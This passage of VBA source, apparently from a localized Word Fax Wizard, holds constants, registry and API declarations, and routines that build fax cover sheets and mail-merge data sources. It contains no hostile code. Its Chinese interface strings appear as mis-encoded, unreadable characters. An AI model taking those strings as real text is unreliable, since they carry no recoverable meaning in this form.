in the wizard.\n'DON'T CHANGE THE NAMES OF THE AUTOTEXT ENTRIES IN THE WIZARD.\n'if you change them, then please change the following strings too, correspondingly\nPublic Const strAT_UNCHKD_BOX   As String = \"Unchecked Box\"\nPublic Const strAT_CHKD_BOX     As String = \"Checked Box\"\nPublic Const strCNTMPGFX2        As String = \"cntmpgfx2\"\nPublic Const strPOST_WIZ_BLN    As String = \"Fax Post Wizard Balloon\"\n\nPublic Const sA4_LEFT_MARGIN    As Single = 82.08\nPublic Const sA4_RIGHT_MARGIN    As Single = 81.36\nPublic Const sLETTER_MARGIN     As Single = 90\n'key where setup writes company name\nPublic Const strREGKEY_CMPNY_NAME As String = \"HKEY_CURRENT_USER\\Software\\Microsoft\\MS Setup (ACME)\\User Info\"\nPublic Const strVALKEY_CMPNY_NAME As String = \"DefCompany\"\n\nPublic fDocChanged As Boolean 'set if user changes the doc. to be faxed\n\nPublic objMainDoc As Document 'main doc which has to be sent\nPublic objDataSrc As MailMergeDataSource ' main doc's data src\n\n'SQL query used to select all names from the data source\nPublic Const strSELECT_QUERY As String = \"Select * From \"\n\n'form and callback balloon constants\nPublic Const iMAX_PANEL As Integer = 6 'panel # of the last panel in\n                             'the dialog (starts from 0)\nPublic rgstrAssistantMsg(iMAX_PANEL) As String   ' as many as there are states\n\nPublic strBULLET     As String\nPublic strSOFT_ENTER As String\nPublic rgstrNotes(3) As String\nPublic strQUOTE As String\n'available styles\nPublic Const iSTY_PROFESSIONAL  As Integer = 0\nPublic Const iSTY_CONTEMPORARY  As Integer = 1\nPublic Const iSTY_ELEGANT       As Integer = 2\n\n'array for holding long and short template names\nPublic rgstrTemplateFileNames(3, 3) As String\nPublic Const iLONG_NAME As Integer = 0\nPublic Const iSHORT_NAME As Integer = 1\n\nPublic iFaxStyle As Integer 'stores the fax style chosen\nPublic fStylesCopied As Boolean\n\nPublic fMSFAXEnabled As Boolean 'disabled in NT\n\n'Panel numbers\nPublic Const iPANEL_RCPNTS As Integer = 3\nPublic Const iPANEL_SENDER As Integer = 5\nPublic Const iPANEL_STYLE  As Integer = 4\n\n'Max. number of recipients\nPublic Const iMAX_RCPNTS As Integer = 5\n\nPublic fDocIsFormLtr As Boolean 'true if doc. is a form letter\n'to store the data options query that the user selects for the form letter\nPublic strFormLetterSQL As String\nPublic strFormLetterSQL1 As String\nPublic strConnectString As String\nPublic fDocPresent   As Boolean 'true if there is an main doc. apart\n                                'from the doc created by FileNew\n'keeps track of which panel to be skipped.\n'if we are enabling a panel, then we need to restore the shape's\n'color to as it was before. rgiColorShape stores that color\nPublic rgfSkipPanel(iMAX_PANEL) As Boolean 'if rgfSkipPanel(i) is True,\n                                            'then skip the ith panel\nPublic rgiColorShape(iMAX_PANEL) As Long\nPublic fCheckValidity As Boolean\nPublic fNoCovSht As Boolean 'False if user selects \"No cover sheet\"\n\nPublic iFaxOption       As Integer 'Fax program selected by the user\nPublic Const iMS_FAX    As Integer = 0  'Microsoft Fax\nPublic Const iDIFF_FAX  As Integer = 1  'Other than MS Fax\nPublic Const iNO_FAX    As Integer = 2  'just print without faxing the doc/cover sheet\n\nPublic fRegistryNamesRead As Boolean 'true if MRU list has been read from reg.\n\nDim rgstrFaxTitle(3)        As String\nDim rgstrChkBoxText(5)      As String 'text beside the check boxes\nPublic strAsstMsgRcpntsFormLtr As String 'assistant help for form letter recipients' panel\nPublic strAsstMsgRcpntsOrdDoc As String 'assistant help for ordinary doc. recipients' panel\n\n'tip displayed in an autodown balloon after the wizard is done\nPublic fCreatedCmdBar           As Boolean 'tip is to be displayed only if cmd bar created\n\n'arrays to get the MRU list of recipient names and numbers stored in the registry\nDim rgstrMRUFaxNames(iMAX_RCPNTS) As String\nDim rgstrMRUFaxNums(iMAX_RCPNTS)  As String\n\n'arrays to get the recipients names and numbers that the user entered\nDim rgstrRcpntFaxNames(iMAX_RCPNTS) As String\nDim rgstrRcpntFaxNums(iMAX_RCPNTS)  As String\nPublic iNumRcpnts As Integer\n\n'DO NOT LOCALIZE - CONTROL NAMES\nPublic Const strCBO_RCPNT_NAME  As String = \"cboRcpntName\"\nPublic Const strCBO_RCPNT_NUM   As String = \"cboRcpntNum\"\nPublic iCboRcpntNameFocus       As Integer\n\n'DO NOT LOCALIZE - REGISTRY ENTRIES\nPublic Const strRCPNT_NAME      As String = \"Name of recipient#\"\nPublic Const strRCPNT_NUMBER    As String = \"Number of recipient#\"\nPublic Const strNUM_RCPNTS      As String = \"Number of recipients\"\n\n'Help files\nPublic Const strWIN_HELP_FILE As String = \"Windows.hlp\"\nPublic Const strFAX_HELP_FILE As String = \"awfax.hlp\"\n\n'contexts for the help\nPublic Const lCNTXT_FAX_INSTALL As Long = 461903903\nPublic Const lCNTXT_FAX_SEND As Long = 1698757633\nPublic Const HELP_COMMAND As Integer = 258 'hex value = 0x0102\n\n'error number that word returns on fax not being installed\nPublic Const iERR_FAX_NOT_INSTALLED As Integer = 5663\nPublic Const iERR_FAX_NOT_SENT As Integer = 4559\n\n'DO NOT LOCALIZE - REGISTRY ENTRIES REGARDING PRINTERS\nDeclare Function RegEnumKey Lib \"advapi32.dll\" Alias \"RegEnumKeyA\" (ByVal hKey As Long, ByVal dwIndex As Long, ByVal lpName As String, ByVal cbName As Long) As Long\n\nDeclare Function RegOpenKey Lib \"advapi32.dll\" Alias \"RegOpenKeyA\" (ByVal hKey As Long, ByVal lpSubKey As String, phkResult As Long) As Long\n\nDeclare Function RegCloseKey Lib \"advapi32.dll\" (ByVal hKey As Long) As Long\n\nDeclare Function GetWindowsDirectory Lib \"kernel32\" Alias \"GetWindowsDirectoryA\" (ByVal strDir As String, ByVal uSize As Integer) As Integer\n\nDeclare Function FindWindow Lib \"USER32\" Alias \"FindWindowA\" (ByVal strWndClassName As String, ByVal strWndName As String) As Long\n\nDeclare Function WinHelp Lib \"USER32\" Alias \"WinHelpA\" (ByVal hwnd As Long, ByVal strFileName As String, ByVal wCmd As Integer, ByVal dwData As Any) As Integer\n\n\nPublic rgstrPrinterNames()  As String\nPublic iTotalNumPrinters    As Integer\n\nConst HKEY_LOCAL_MACHINE As Long = &H80000002\n'Const KEY_ALL_ACCESS As Long = &HF0063\nConst ERROR_SUCCESS As Long = 0\nConst ERROR_NO_MORE_ITEMS As Long = 259\n\n'registry keys under which printer names are found\nConst strREG_PROVIDERS As String = \"System\\CurrentControlSet\\Control\\Print\\Providers\\\"\nConst strREG_LOCAL_PRINTERS As String = \"System\\CurrentControlSet\\Control\\Print\\Printers\\\"\n\n'initialise the vars. whiehc refer to the wizard's name\nPublic Sub InitWizardName(fDummy As Boolean)\n    \n    strWizName = \"\u00a4\u00a4\u00a4\u00e5\u00b6\u00c7\u00afu\u00ba\u00eb\u00c6F\"\n    strWizLongName = \"\u00a4\u00a4\u00a4\u00e5\u00b6\u00c7\u00afu\u00ba\u00eb\u00c6F\"\n    strWizShortName = \"CFax1\"\n\nEnd Sub\n\n'initialize strings specific to this wizard\nPrivate Sub InitWizardStrings()\nDim i As Integer\n    \n    'fax title for the different styles\n    rgstrFaxTitle(iSTY_CONTEMPORARY) = \"\u00b6\u00c7\u00afu\u00abH\u00a5\u00f3\"\n    rgstrFaxTitle(iSTY_ELEGANT) = \"\u00b6\u00c7\u00afu\u00abH\u00a5\u00f3\u00aa\u00ed\u00b3\u00e6\"\n    rgstrFaxTitle(iSTY_PROFESSIONAL) = \"\u00b6\u00c7\u00afu\"\n    \n    'text appearing after the unchecked boxes\n    rgstrChkBoxText(1) = \"\u00ab\u00e6\u00a5\u00f3\"\n    rgstrChkBoxText(2) = \"\u00bd\u00d0\u00acd\u00be\\\"\n    rgstrChkBoxText(3) = \"\u00bd\u00d0\u00a7\u00e5\u00a5\u00dc\"\n    rgstrChkBoxText(4) = \"\u00bd\u00d0\u00a6^\u00c2\u00d0\"\n    rgstrChkBoxText(5) = \"\u00bd\u00d0\u00b6\u00c7\u00be\\\"\n    \n    'Assistant messages\n    rgstrAssistantMsg(0) = \"\u00a8\u00cf\u00a5\u00ce\u00b6\u00c7\u00afu\u00ba\u00eb\u00c6F\u00a1A\u00b1z\u00a5i\u00a5H\u00b6\u00c7\u00afu\u00b9q\u00a4l\u00b6l\u00a5\u00f3\u00a1A\u00b1N\u00abH\u00a5\u00f3\u00a6X\u00a8\u00d6\u00a8\u00ec\u00b6\u00c7\u00afu\u00a4\u00e5\u00a5\u00f3\u00a4\u00a4\u00a4@\u00b0_\u00b6\u00c7\u00afu\u00a1A \u00a9\u00ce\u00b1q\u00b6\u00c7\u00afu\u00be\u00f7\u00a4\u00a4\u00a6L\u00a5X\u00a4@\u00b1i\u00ab\u00ca\u00ad\u00b1\u00aa\u00ed\u00b3\u00e6\u00a1C\"\n    rgstrAssistantMsg(1) = \"\u00a6p\u00aaG\u00b1z\u00b7Q\u00adn\u00b6\u00c7\u00afu\u00a8\u00e4\u00a5\u00a6\u00a4\u00e5\u00a5\u00f3\u00a1A\u00bd\u00d0\u00a5\u00fd\u00b6}\u00b1\u00d2\u00b1z\u00b7Q\u00adn\u00b6\u00c7\u00afu\u00aa\u00ba\u00a4\u00e5\u00a5\u00f3\u00a1A\u00b5M\u00ab\u00e1\u00a6A\u00b0\u00f5\u00a6\u00e6\u00b6\u00c7\u00afu\u00ba\u00eb\u00c6F\u00a1C\"\n    rgstrAssistantMsg(2) = \"\u00a6p\u00aaG\u00b1z\u00aa\u00ba\u00a7@\u00b7~\u00a8t\u00b2\u00ce\u00acO Windows NT\u00a1A\u00abh\u00b1z\u00b5L\u00aak\u00a8\u00cf\u00a5\u00ce Microsoft \u00b6\u00c7\u00afu\u00a1A\u00a6\u00fd\u00acO\u00b1z\u00c1\u00d9\u00acO\u00a5i\u00a5H\u00a8\u00cf\u00a5\u00ce\u00a8\u00e4\u00a5\u00a6\u00a4w\u00a6w\u00b8\u00cb\u00a6b\u00a8t\u00b2\u00ce\u00a4\u00a4\u00aa\u00ba\u00b6\u00c7\u00afu\u00b3n\u00c5\u00e9\u00a8\u00d3\u00ac\u00b0\u00b1z\u00b6\u00c7\u00afu\u00a1C\u00a6p\u00aaG\u00b1z\u00aa\u00ba\u00a8t\u00b2\u00ce\u00a4\u00a3\u00a4\u00e4\u00b4\u00a9\u00b6\u00c7\u00afu\u00a5\\\u00af\u00e0\u00aa\u00ba\u00b8\u00dc\u00a1A\u00a8S\u00c3\u00f6\u00abY\u00a1A\u00b1z\u00a5i\u00a5H\u00a5\u00fd\u00b1N\u00a4\u00e5\u00a5\u00f3\u00a6C\u00a6L\u00a5X\u00a8\u00d3\u00a1A\u00b5M\u00ab\u00e1\u00a6A\u00a7Q\u00a5\u00ce\u00b6\u00c7\u00afu\u00be\u00f7\u00b1N\u00a4\u00e5\u00a5\u00f3\u00b6\u00c7\u00afu\u00a5X\u00a5h\u00a1C\"\n    rgstrAssistantMsg(iPANEL_RCPNTS) = \"\u00a6p\u00aaG\u00b1z\u00b4\u00bf\u00a5\u00ce\u00b9L\u00b6\u00c7\u00afu\u00ba\u00eb\u00c6F\u00a1A\u00abh\u00a4U\u00a9\u00d4\u00a6\u00a1\u00b2M\u00b3\u00e6\u00a4\u00e8\u00b6\u00f4\u00a4\u00a4\u00b7|\u00a6C\u00a5X\u00b1z\u00b3\u00cc\u00aa\u00f1\u00b6\u00c7\u00afu\u00b9L\u00aa\u00ba\u00a4\u00e5\u00a5\u00f3\u00a6W\u00ba\u00d9\u00a1C \u00b1z\u00a5i\u00a5H\u00a6b\u00b2M\u00b3\u00e6\u00a4\u00a4\u00bf\u00ef\u00a8\u00fa\u00b6\u00c7\u00afu\u00b9L\u00aa\u00ba\u00a4\u00e5\u00a5\u00f3\u00a1A\u00b1N\u00a8\u00e4\u00aa\u00fe\u00a6b\u00b1z\u00aa\u00ba\u00ab\u00ca\u00ad\u00b1\u00aa\u00ed\u00b3\u00e6\u00a4\u00a7\u00ab\u00e1\u00a4@\u00b0_\u00b6\u00c7\u00afu\u00a5X\u00a5h\u00a1C\"\n    rgstrAssistantMsg(iPANEL_SENDER) = \"\u00bd\u00d0\u00bf\u00e9\u00a4J\u00b1z\u00b7Q\u00bcg\u00a6b\u00ab\u00ca\u00ad\u00b1\u00aa\u00ed\u00b3\u00e6\u00a4W\u00a6\u00b3\u00c3\u00f6\u00b0e\u00a5\u00f3\u00aa\u00cc\u00aa\u00ba\u00b8\u00ea\u00ae\u00c6\u00a1C\"\n    rgstrAssistantMsg(iPANEL_STYLE) = \"\u00bd\u00d0\u00bf\u00ef\u00a8\u00fa\u00b1z\u00ab\u00ca\u00ad\u00b1\u00aa\u00ed\u00b3\u00e6\u00a9\u00d2\u00adn\u00aa\u00ba\u00ae\u00e6\u00a6\u00a1\u00a1C\u00a6b\u00b6\u00c7\u00afu\u00a4\u00a7\u00abe\u00a1A\u00b1z\u00c1\u00d9\u00acO\u00a5i\u00a5H\u00a7\u00ef\u00c5\u00dc\u00ab\u00ca\u00ad\u00b1\u00aa\u00ed\u00b3\u00e6\u00aa\u00ba\u00a5~\u00c6[\u00a1A\u00a9\u00ce\u00acO\u00a5[\u00a4J\u00a5\u00b2\u00adn\u00aa\u00ba\u00b5\u00f9\u00b0O\u00a1C\"\n    rgstrAssistantMsg(iMAX_PANEL) = \"\u00adn\u00ad\u00d7\u00a7\u00ef\u00a5\u00f4\u00a6\u00f3\u00b3]\u00a9w\u00a1A\u00bd\u00d0\u00ab\u00f6\u00a1u\u00a4W\u00a4@\u00a8B\u00a1v\u00a1C\"\n    'if user is faxing a form letter, we have a different set of controls in the Recipients panel. So, we change the help text too.\n    strAsstMsgRcpntsFormLtr = \"\u00bd\u00d0\u00c2I\u00a8\u00fa\u00a1u\u00a9m\u00a6W\u00a1v\u00c4\u00e6\u00a6\u00ec\u00a1A\u00a6A\u00a8\u00d3\u00bd\u00d0\u00c2I\u00a8\u00fa\u00a1u\u00b6\u00c7\u00afu\u00b9q\u00b8\u00dc\u00a1v\u00c4\u00e6\u00a6\u00ec\u00a1A \u00b5M\u00ab\u00e1\u00b1q\u00b3q\u00b0T\u00bf\u00fd\u00a4\u00a4\u00bf\u00ef\u00a8\u00fa\u00adn\u00a5[\u00a4J\u00aa\u00ba\u00a6\u00ac\u00a5\u00f3\u00a4H\u00a9\u00ce\u00a8\u00e4\u00b6\u00c7\u00afu\u00b9q\u00b8\u00dc\u00a1C \u00b1z\u00a5i\u00a5H\u00bf\u00ef\u00be\u00dc\u00b6\u00c7\u00afu\u00b5\u00b9\u00a8C\u00a4@\u00ad\u00d3\u00a4H\u00a9\u00ce\u00acO\u00ab\u00fc\u00a9w\u00a5u\u00b6\u00c7\u00afu\u00b5\u00b9\u00acY\u00a4H\u00a1C\"\n    strAsstMsgRcpntsOrdDoc = \"\u00a6p\u00aaG\u00b1z\u00b4\u00bf\u00a5\u00ce\u00b9L\u00b6\u00c7\u00afu\u00ba\u00eb\u00c6F\u00a1A\u00a8\u00ba\u00bb\u00f2\u00a1u\u00a9m\u00a6W\u00a1v\u00c4\u00e6\u00a6\u00ec\u00aa\u00ba\u00a4U\u00a9\u00d4\u00a6\u00a1\u00b2M\u00b3\u00e6\u00a4\u00e8\u00b6\u00f4\u00a4\u00a4\u00b7|\u00a6\u00b3\u00b3\u00cc\u00aa\u00f1\u00b6\u00c7\u00afu\u00b9\u00ef\u00b6H\u00aa\u00ba\u00a6W\u00a6r\u00a1C\u00b1z\u00a5i\u00a5H\u00b1q\u00a4\u00a4\u00bf\u00ef\u00a8\u00fa\u00a6\u00ac\u00a5\u00f3\u00aa\u00cc\u00a9m\u00a6W\u00b4\u00a1\u00a4J\u00ab\u00ca\u00ad\u00b1\u00aa\u00ed\u00b3\u00e6\u00a4\u00a4\u00a1C\"\n    \n\n    rgstrTemplateFileNames(iSTY_PROFESSIONAL, iLONG_NAME) = \"\u00b1M\u00b7~\u00a6\u00a1\u00b6\u00c7\u00afu.dot\"\n    rgstrTemplateFileNames(iSTY_PROFESSIONAL, iSHORT_NAME) = \"cPrfax.dot\"\n    rgstrTemplateFileNames(iSTY_CONTEMPORARY, iLONG_NAME) = \"\u00b2{\u00a5N\u00a6\u00a1\u00b6\u00c7\u00afu.dot\"\n    rgstrTemplateFileNames(iSTY_CONTEMPORARY, iSHORT_NAME) = \"cCofax.dot\"\n    rgstrTemplateFileNames(iSTY_ELEGANT, iLONG_NAME) = \"\u00a8\u00e5\u00b6\u00ae\u00a6\u00a1\u00b6\u00c7\u00afu.dot\"\n    rgstrTemplateFileNames(iSTY_ELEGANT, iSHORT_NAME) = \"cElfax.dot\"\n    \n    rgstrNotes(iSTY_PROFESSIONAL) = \"\u00b5\u00f9\u00b8\u00d1\u00a1G\"\n    rgstrNotes(iSTY_CONTEMPORARY) = \"\u00b5\u00f9\u00b8\u00d1\u00a1G\"\n    rgstrNotes(iSTY_ELEGANT) = \"\u00b5\u00f9\u00b8\u00d1\u00a1G\"\n    \n    ''**********************************************************************\n    'DO NOT LOCALIZE BEYOND THIS POINT.\n    ''******************************************************************************\n    \n    'initialize arrays with the color of the subway shapes for the panels\n    For i = 0 To iMAX_PANEL\n        rgfSkipPanel(i) = False\n        rgiColorShape(i) = COLOR_LIGHTGREY\n    Next i\n\n    strBULLET = \"\u2022\"\"\"\n    strSOFT_ENTER = Chr$(11)\n    strQUOTE = Chr$(34)\n                                        \n    'DO NOT LOCALIZE THE NEXT STRING. WE WANT TO STORE ONLY ONE SET\n    'OF DIALOG VALUES IN THE REGISTRY.\n    strRegSettingsKey = strREG_SETTINGS_BASE_KEY & \"Fax Wizard\"\nEnd Sub\n\n'initialises the form\nPrivate Sub InitForm()\n    On Error GoTo FatalError\n    \n    Set formWizard = New formWizDlg\n    If formWizard Is Nothing Then\n        DisplayErrorMsg strERR_INIT_FORM\n        ReportError Err\n    End If\n\n    iCurrentPanel = 0\n    formWizard.lblWizardName1.Caption = \" \" & strWizLongName & \" \"\n    Exit Sub\n\nFatalError:\n    DisplayErrorMsg strERR_INIT_FORM\n    ReportError Err\n    \nEnd Sub\n\nSub InitWizard(fDummy As Boolean)\n    \n    InitForm\n    InitWizardStrings\n\n    fNoCovSht = False\n    fStylesCopied = False\nEnd Sub\n\nPublic Sub SetMainDoc(fDummy As Boolean)\nDim cDocs As Integer\nDim i As Integer\n\n    On Error GoTo FatalError\n    \n    fDocIsFormLtr = False\n    fDocPresent = False\n    fDocChanged = False\n    cDocs = Application.Documents.Count\n    \n    If cDocs > 1 Then\n    'we don't want to add the doc. that was just created thro' FileNew\n        For i = 2 To cDocs\n            formWizard.cboDocList.AddItem Documents(i).Name\n        Next i\n\n        formWizard.cboDocList.ListIndex = 0\n        fDocPresent = True\n    Else\n        'just one doc. i.e the freshly created one\n        Set objMainDoc = Nothing\n    End If\n    Exit Sub\n\nFatalError:\n    ReportError Err\n\nEnd Sub\n\n'checks the kind of document and sets fDocIsFormLtr\nPublic Sub CheckDocKind(objDoc As Document)\nDim objMM As MailMerge\nDim strQueryString As String\n    On Error GoTo LReturn\n    fDocIsFormLtr = False\n    Set objMM = objMainDoc.MailMerge\n    Set objDataSrc = objMM.DataSource\n    If objDataSrc.Type = wdNoMergeInfo Then GoTo LReturn\n    strQueryString = objDataSrc.QueryString\n    strFormLetterSQL = Left$(strQueryString, 255)\n    strFormLetterSQL1 = Mid$(strQueryString, 256)\n    strConnectString = objDataSrc.ConnectString\n    fDocIsFormLtr = True\n    \n    Exit Sub\nLReturn:\n    Err.Clear\n    fDocIsFormLtr = False\nEnd Sub\n\nPublic Sub CreateCoverSheet(fDummy As Boolean)\nDim strDocName As String\nDim objFps As PageSetup\n\n    On Error GoTo FatalError\n    Application.StatusBar = strCREATING_DOC\n    Application.ScreenUpdating = False\n    \n    System.Cursor = wdCursorWait\n\n    If fChangeToA4 Then\n        Set objFps = ActiveDocument.PageSetup\n        objFps.LeftMargin = sA4_LEFT_MARGIN\n        objFps.RightMargin = sA4_RIGHT_MARGIN\n    ElseIf fChangeToLetter Then\n        Set objFps = ActiveDocument.PageSetup\n        objFps.LeftMargin = sLETTER_MARGIN\n        objFps.RightMargin = sLETTER_MARGIN\n    End If\n    \n    If (((Not (fDocIsFormLtr)) And (iNumRcpnts > 1)) Or fDocIsFormLtr) Then         CreateDataSource\n        \n    StatusBar = strCREATING_DOC\n    Select Case iFaxStyle\n    Case iSTY_PROFESSIONAL\n        CreateProfContCoverSheet\n    Case iSTY_CONTEMPORARY\n        CreateProfContCoverSheet\n    Case iSTY_ELEGANT\n        CreateElegCoverSheet\n    End Select\n    \n    If (fDocPresent) And (Not (formWizard.optCovSht.Value)) Then\n        strDocName = ActiveWindow.Caption & \" - \" & objMainDoc.Name & strWINDOW_CAPTION\n    Else\n        strDocName = ActiveWindow.Caption & strCOVER_SHEET_CAPTION\n    End If\n        \n    With ActiveWindow\n        .Caption = strDocName\n\n        .View.TableGridlines = False\n    End With\n    ActiveDocument.UndoClear\n    Selection.HomeKey wdStory\n    \n    With ActiveDocument.Content\n        .SpellingChecked = True\n        .GrammarChecked = True\n    End With\n    \n    Exit Sub\n    \nFatalError:\n    ReportError Err\nEnd Sub\n\n'creates a data source for the cover sheet in the temp. directory\nPrivate Sub CreateDataSource()\nDim objRng As Range\nDim strPath As String\nDim objDataSrcDoc As Document, objMM As MailMerge\nDim strDataSrcName As String\n    On Error GoTo FatalError\n    \n    Set objMM = ActiveDocument.MailMerge\n    objMM.MainDocumentType = wdFormLetters\n    \n    If (fDocIsFormLtr) Then\n        objMM.OpenDataSource objDataSrc.Name, Connection:=strConnectString\n        objMM.DataSource.QueryString = strFormLetterSQL & strFormLetterSQL1\n        Exit Sub\n    End If\n    \n    Set objDataSrcDoc = Application.Documents.Add\n    \n    Set objRng = objDataSrcDoc.Content\n    \n    CreateTableFromFaxInfo objRng\n    \n    strPath = Options.DefaultFilePath(wdTempFilePath)\n    If Right$(strPath, 1) <> strPathSeparator Then         strPath = strPath & strPathSeparator\n        \n    strDataSrcName = strPath & \"~$CovSht@\" & Format$(Date, \"dd-mm-yy\") & \",\" & Format$(Time, \"hh-mm-ss\") & \".tmp\"\n    objDataSrcDoc.SaveAs strDataSrcName, wdFormatDocument\n    objDataSrcDoc.Close wdDoNotSaveChanges\n    \n    'attach the data source doc. to activedocument (cover sheet)\n    objMM.OpenDataSource strDataSrcName\n    \n    Exit Sub\nFatalError:\n    ReportError Err\nEnd Sub\n\n\n'creates a table in the data source document with names and numbers\n'the format of the table is just like how one would create a data source doc.\n'through Word\nPrivate Sub CreateTableFromFaxInfo(objRange As Range)\nDim strText As String\nDim i As Integer\n\n    On Error GoTo FatalError\n\n    strText = strFLD_FAX_NAME & vbCr & strFLD_FAX_NUMBER\n    \n    'collect the names and numbers entered by the user\n    For i = 1 To iNumRcpnts\n        strText = strText & vbCr & rgstrRcpntFaxNames(i - 1) & vbCr & rgstrRcpntFaxNums(i - 1)\n    Next i\n\n    objRange.InsertBefore strText\n    'Add a table with 2 columns and iNumRcpnts+1 rows\n    objRange.Select\n    Selection.ConvertToTable vbCr, iNumRcpnts + 1, 2\n    \n    Exit Sub\nFatalError:\n    ActiveDocument.Close wdDoNotSaveChanges 'close the data source doc.\n    ReportError Err\nEnd Sub\n\nPublic Function FCopyStyles(iStyle As Integer) As Boolean\n    Dim strStyleName As String\n    Dim strLongName As String\n    Dim i As Integer\n    \n    On Error GoTo TemplateNotFound\nLFindTemplate:\n    ' Attempt to locate longname, then shortname template file\n    i = iLONG_NAME\n    strStyleName = strTemplatePath & rgstrTemplateFileNames(iStyle, iLONG_NAME)\n    strLongName = strStyleName\n    If Dir(strStyleName) <> \"\" Then GoTo LApplyStyles\nLTryShortName:\n    i = iSHORT_NAME\n    strStyleName = strTemplatePath & rgstrTemplateFileNames(iStyle, iSHORT_NAME)\n\nLApplyStyles:\n    StatusBar = strAPPLYING\n    \n    ' Get styles\n    ActiveDocument.CopyStylesFromTemplate (strStyleName)\n    \n    ' No Error\n    fStylesCopied = True\n    StatusBar = \"\"\n    FCopyStyles = True\n    Exit Function\n    \nTemplateNotFound:\n    If i = iLONG_NAME Then\n        i = iSHORT_NAME\n        Err.Clear\n        GoTo LTryShortName\n    End If\n    DisplayErrorMsg strERR_STYLE_NOT_FOUND & strLongName & strERR_STYLE_NOT_FOUND2\n    fStylesCopied = False\n    StatusBar = \"\"\n    FCopyStyles = False\nEnd Function\n\n'creates professional/Contemporary style cover sheet\nPrivate Sub CreateProfContCoverSheet()\nDim objRngBuffer1 As Range\nDim objRngBuffer2 As Range\nDim strCmpnyName As String, strName As String\nDim strMFFirstName As String, strMFLastName As String, strMFFaxNum As String\nDim objRngTextTable As Range\nDim objTable As Table\n\n    On Error GoTo FatalError\n    \n    If iFaxStyle = iSTY_CONTEMPORARY Then\n        InsertContAutoText\n        objActiveRange.Collapse wdCollapseEnd\n    End If\n    \n    InsertReturnAddress\n    GetMergeFieldNames strMFFirstName, strMFLastName, strMFFaxNum\n    \n    'Insert company name\n    strCmpnyName = formWizard.txtCompany.Text\n    If (iFaxStyle = iSTY_PROFESSIONAL) Then\n        If (Len(strCmpnyName)) Then\n            objActiveRange.Style = strSTY_COMPANY_NAME\n            objActiveRange.InsertBefore strCmpnyName & vbCr\n            objActiveRange.Collapse wdCollapseEnd\n        End If\n        'Insert title\n        objActiveRange.Style = strSTY_DOC_LABEL\n        objActiveRange.InsertBefore rgstrFaxTitle(iFaxStyle) & vbCr\n        objActiveRange.Collapse wdCollapseEnd\n    End If\n    \n\n    \n    Set objRngTextTable = objActiveRange.Duplicate\n    \n'the topics To: and From: have a character style which has to be\n'applied after the data has been written (since the data have a\n'different style). so, use a range buffer\n    \n    '1st line text has style \"Message Header First\". The subsequent\n    'lines have \"Message Header\"\n    \n    'Insert To:\n    objActiveRange.Style = strSTY_MSG_HDR_FIRST\n    objActiveRange.InsertBefore strTO\n    Set objRngBuffer1 = objActiveRange.Duplicate\n\n    'insert recipient name\n    If (iNumRcpnts = 1) And (Not (fDocIsFormLtr)) Then\n        objActiveRange.InsertAfter vbTab & rgstrRcpntFaxNames(0) & vbTab\n    Else\n        'insert appropriate field\n        objActiveRange.InsertAfter vbTab\n        objActiveRange.Collapse wdCollapseEnd\n        If ((iNumRcpnts > 1) Or (fDocIsFormLtr)) Then\n            InsertField objActiveRange, wdFieldMergeField, strMFFirstName, True\n            If Len(strMFLastName) Then\n                objActiveRange.InsertAfter strSPACE\n                objActiveRange.Collapse wdCollapseEnd\n                InsertField objActiveRange, wdFieldMergeField, strMFLastName, True\n            End If\n        Else\n            InsertField objActiveRange, wdFieldMacroButton, strEMPTY_MACRO & strCLICK_HERE_NAME, False\n        End If\n        objActiveRange.InsertAfter vbTab\n    End If\n    \n    objActiveRange.Collapse wdCollapseEnd\n    \n    'Insert From:\n    objActiveRange.InsertBefore strFROM\n    Set objRngBuffer2 = objActiveRange.Duplicate\n    \n    'insert sender's name\n    strName = formWizard.txtSenderName.Text\n    If Len(strName) Then\n        objActiveRange.InsertAfter vbTab & strName & vbCr\n    Else\n        objActiveRange.InsertAfter vbTab\n        objActiveRange.Collapse wdCollapseEnd\n        'insert macrobutton field.\n        InsertField objActiveRange, wdFieldMacroButton, strEMPTY_MACRO & strCLICK_HERE_NAME, False\n        objActiveRange.InsertParagraphAfter\n    End If\n    objActiveRange.Collapse wdCollapseEnd\n    'set character style for topics\n    objRngBuffer1.Style = strSTY_MSG_HDR_LABEL\n    objRngBuffer2.Style = strSTY_MSG_HDR_LABEL\n    \n    'next 3 lines in \"Message Header\" style\n    'Insert Fax Number\n    objActiveRange.Style = wdStyleMessageHeader\n    \n    objActiveRange.InsertBefore strFAX\n    Set objRngBuffer1 = objActiveRange.Duplicate\n\n    If (iNumRcpnts = 1) And (Not (fDocIsFormLtr)) Then\n        objActiveRange.InsertAfter vbTab & rgstrRcpntFaxNums(0) & vbTab\n    Else\n        objActiveRange.InsertAfter vbTab\n        objActiveRange.Collapse wdCollapseEnd\n        'insert the appropriate field\n        If ((iNumRcpnts > 1) Or (fDocIsFormLtr)) Then\n            InsertField objActiveRange, wdFieldMergeField, strMFFaxNum, True\n        Else\n            InsertField objActiveRange, wdFieldMacroButton, strEMPTY_MACRO & strCLICK_HERE_FAX_NUMBER, False\n        End If\n        objActiveRange.InsertAfter vbTab\n    End If\n    \n    objActiveRange.Collapse wdCollapseEnd\n    \n    'Insert Date\n    objActiveRange.InsertBefore strDATE\n    Set objRngBuffer2 = objActiveRange.Duplicate\n    objActiveRange.InsertAfter vbTab\n    objActiveRange.Collapse wdCollapseEnd\n    'insert datefield\n    InsertField objActiveRange, wdFieldTime, \"\\@ \" & strQUOTE & strDATE_FORMAT & strQUOTE, True\n\n    objActiveRange.InsertParagraphAfter\n    objActiveRange.Collapse wdCollapseEnd\n    'set character style for topics\n    objRngBuffer1.Style = strSTY_MSG_HDR_LABEL\n    objRngBuffer2.Style = strSTY_MSG_HDR_LABEL\n    \n    \n    'Next line\n    'Insert Phone\n    objActiveRange.InsertBefore strPHONE\n    Set objRngBuffer1 = objActiveRange.Duplicate\n    objActiveRange.InsertAfter vbTab\n    objActiveRange.Collapse wdCollapseEnd\n    InsertField objActiveRange, wdFieldMacroButton, strEMPTY_MACRO & strCLICK_HERE_PHONE_NUMBER, False\n    objActiveRange.InsertAfter vbTab\n    objActiveRange.Collapse wdCollapseEnd\n    \n    'Insert Pages:\n    objActiveRange.InsertBefore strPAGES\n    Set objRngBuffer2 = objActiveRange.Duplicate\n    objActiveRange.InsertAfter vbTab\n    objActiveRange.Collapse wdCollapseEnd\n\n    InsertField objActiveRange, wdFieldMacroButton, strEMPTY_MACRO & strCLICK_HERE_PAGES, False\n    objActiveRange.InsertParagraphAfter\n    objActiveRange.Collapse wdCollapseEnd\n    'set character style for topics\n    